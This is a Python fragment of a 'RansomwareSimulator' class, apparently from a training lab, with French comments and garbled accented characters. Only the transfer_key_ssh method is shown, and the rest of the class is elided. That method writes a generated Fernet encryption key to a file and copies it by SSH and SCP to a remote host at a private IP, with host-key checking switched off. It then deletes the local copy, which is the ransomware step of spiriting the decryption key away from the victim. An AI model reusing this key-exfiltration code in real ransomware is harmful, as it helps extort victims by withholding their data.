#!/usr/bin/env python3
import os
import sys
import subprocess
from cryptography.fernet import Fernet
from pathlib import Path

# Configuration
SSH_SERVER = "192.168.45.90"
SSH_USER = "doranco"
REMOTE_DIR = "/home/doranco/Desktop/script/cle_dechiffrement"
KEY_FILE = "decryption_key.key"
SSH_KEY_PATH = "/home/doranco/.ssh/id_rsa"  # Chemin vers votre cl√© priv√©e SSH

class RansomwareSimulator:
    # ... (le reste de votre classe reste inchang√© jusqu'√† la m√©thode transfer_key_ssh)

    def transfer_key_ssh(self):
        """Transf√®re la cl√© via SSH en utilisant une cl√© d'authentification"""
        if not self.key:
            print("\n‚ùå Aucune cl√© g√©n√©r√©e!")
            return False

        try:
            print("\nüîÑ Transfert de la cl√©...")
            
            # Cr√©e un fichier temporaire
            with open(KEY_FILE, 'wb') as f:
                f.write(self.key)
            
            # Cr√©e le r√©pertoire distant avec SSH
            subprocess.run([
                'ssh',
                '-i', SSH_KEY_PATH,  # Utilisation de la cl√© SSH
                f'{SSH_USER}@{SSH_SERVER}',
                f'mkdir -p {REMOTE_DIR}'
            ], check=True)
            
            # Copie la cl√© via SCP
            subprocess.run([
                'scp',
                '-i', SSH_KEY_PATH,  # Utilisation de la cl√© SSH
                '-o', 'StrictHostKeyChecking=no',
                KEY_FILE,
                f'{SSH_USER}@{SSH_SERVER}:{REMOTE_DIR}/{KEY_FILE}'
            ], check=True)
            
            # Nettoyage
            os.remove(KEY_FILE)
            
            print(f"\nüì§ Cl√© transf√©r√©e avec succ√®s vers :")
            print(f"   Serveur: {SSH_SERVER}")
            print(f"   Chemin: {REMOTE_DIR}/{KEY_FILE}")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"\n‚ùå √âchec du transfert SSH: {e}")
            print("V√©rifiez que:")
            print(f"1. La cl√© SSH {SSH_KEY_PATH} existe")
            print(f"2. La cl√© est autoris√©e sur {SSH_USER}@{SSH_SERVER}")
            print("3. Le serveur SSH accepte les connexions par cl√©")
            return False

    # ... (le reste de votre classe reste inchang√©)